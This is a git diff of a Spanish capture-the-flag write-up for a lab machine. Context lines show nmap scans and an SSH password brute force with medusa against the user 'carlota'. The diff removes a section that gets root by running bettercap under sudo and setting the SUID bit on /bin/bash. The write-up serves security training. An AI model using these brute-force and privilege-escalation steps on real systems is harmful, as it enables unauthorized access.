@@ -23,7 +23,7 @@ nmap --open -p- -n -sS -Pn $ip -oG FirsScan
 
 _____________________________________________________________________________________________________________________________
 
-### ENUMERAR SERVICIOS
+### Enumerar Servicios
 Realizamos enumaeración a los puertos abiertos.
 ~~~ bash
 nmap -sVC -p 22,80 172.17.0.2 -oN ServicesScan
@@ -112,11 +112,11 @@ medusa -h 172.17.0.2 -u carlota -P /usr/share/wordlists/rockyou.txt -M ssh -t 4
 
 __¡¡BINGO!! obtuvimos las credenciales de Carlota.__
 
-
+_____________________________________________________________________________________________________________________________
 # Escalada de privilegios
 
 
-Una vez tenemos acceso, tratamos la TTY para poder usarla comodamente, para esto cambiaremos el valor de la variable `$TERM`
+Una vez tenemos acceso, tratamos la TTY para poder usarla comodamente, para esto cambiaremos el valor de la variable `$TERM`. En este caso, nuestra shell (SSH) ya es interactiva, solo necesitaremos export TERM=xterm,
 
 ~~~ bash
 > control Z
@@ -134,33 +134,11 @@ stty rows 44 columns 184
 
 ## Sudoers
 
-Primeramente veremos si tenemos privilegios `sudo` con el siguiente comando
+Primeramente veremos si tenemos privilegios `sudo` con el siguiente comando:
 
 ~~~ bash
 sudo -l
 ~~~
 
 ![sudo -l]()
-
-- `-l`: Enumerar los comandos permitidos (o prohibidos) invocables por el usuario en la máquina actual
-
-![exec bettercap with sudo]()
-
-Veamos el panel de ayuda con el comando `help`
-
-
-## SUID Privilege Escalation
-
-Esta opción (`!`) nos permite ejecutar un comando a nivel de sistema, así que podemos asignar el privilegio SUID a la `bash` para ejecutarla como `root`, para eso, lo haremos con el comando `chmod`, dentro de la consola interactiva de `bettercap` ejecutamos el siguiente comando
-
-~~~ bash
-! chmod u+s /bin/bash
-~~~
-
-
-- `-eval`: Ejecutar un comando en la máquina
-
-
-
-
 
